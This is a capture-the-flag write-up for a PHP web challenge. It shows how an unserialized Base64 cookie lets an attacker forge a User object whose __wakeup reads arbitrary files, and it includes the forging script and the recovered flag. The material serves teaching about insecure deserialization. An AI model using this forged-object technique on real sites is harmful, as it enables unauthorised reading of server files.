# ## Penguim - (De)Serial Killer

**Author:** randN
**Category:** web
**Difficulty:** easy

## Description
```
Mr Penguim published a website where you can create an account and acess your profile, but be careful because the path to his profile picture is always staring at you.
```

## Solve

The challenge source code was provided, including the Dockerfile. We could look at the source code first, and try to access the application and see how it works. Accessing the URL, the first page served:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/deserial_killer/images/home_page.png?raw=true)

Acessing the register link:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/deserial_killer/images/register_page.png?raw=true)

After creating an account and a successful login:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/deserial_killer/images/login_success.png?raw=true)

we are served an image and we also get a cookie:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/deserial_killer/images/cookie_user.png?raw=true)

The cookie look like something that was encoded in Base64, and by the looks of it a PHP object serialized, because of the first characters `Tz0` that is `O:` decode. All objects serialized in PHP have the same format, and the only thing that changes are the attributes type (int, string, ...) and the size of them.

```bash
echo -n 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6InRlc3RlciI7czoxMjoicGljdHVyZV9wYXRoIjtzOjMxOiIvdmFyL3d3dy9odG1sL2F2YXRhci9hdmF0YXIuanBnIjtzOjExOiJwcm9maWxlX3BpYyI7Tjt9' | base64 -d
# Returns
O:4:"User":3:{s:8:"username";s:6:"tester";s:12:"picture_path";s:31:"/var/www/html/avatar/avatar.jpg";s:11:"profile_pic";N;}
```

By the looks of it there is serialization is being used in the web app, but we can confirm that by analyzing the source code. In the index.php:

```php
$tmp = base64_encode(serialize(new User($row['username'], $row['pic_path'])));
setcookie("user", $tmp);
```

that is later used in the home.php file.

```php
$user_obj = unserialize(base64_decode($_COOKIE['user']));
```

The object that is serialized:

```php
class User {
    public $username;
    public $picture_path;
    public $profile_pic;

    public function __construct($name, $path) {
        $this->username = $name;
        $this->picture_path = $path;
    }

    public function __wakeup() {
        $this->profile_pic = file_get_contents($this->picture_path);
    }
}
```

If you go to [unserialize](https://www.php.net/manual/en/function.unserialize) function documentation, we will find that "If the variable being unserialized is an object, after successfully reconstructing the object PHP will automatically attempt to call the [\_\_unserialize()](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize) or [\_\_wakeup()](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup) methods (if one exists)."

So, if we create an object where we control the *picture_path* variable, we will be able to get the contents of any file, because there is no protection against Path Traversal.

To create the desired object, we can create a simple PHP script, like so

```php
<?php
class User {
    public $username;
    public $picture_path;
    public $profile_pic;

    public function __construct($name, $path) {
        $this->username = $name;
        $this->picture_path = $path;
    }
}

print(base64_encode(serialize(new User('tester', '/flag'))));
?>
```

We can fing the flag location inside the Dockerfile. Now we can use the payload generated, change the *user* cookie and reload the page. The image does not render now, because the file is not an image, looking into the page source

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/deserial_killer/images/page_source.png?raw=true)

and decoding the Base64

```bash
echo -n 'Q1RGVUF7cEhwX3VuczNyMWFsaVplX2sxbmd9Cg==' | base64 -d
# We get the flag
CTFUA{pHp_uns3r1aliZe_k1ng}
```

### Some good resources if you want to learn more

https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
https://book.hacktricks.xyz/pentesting-web/deserialization
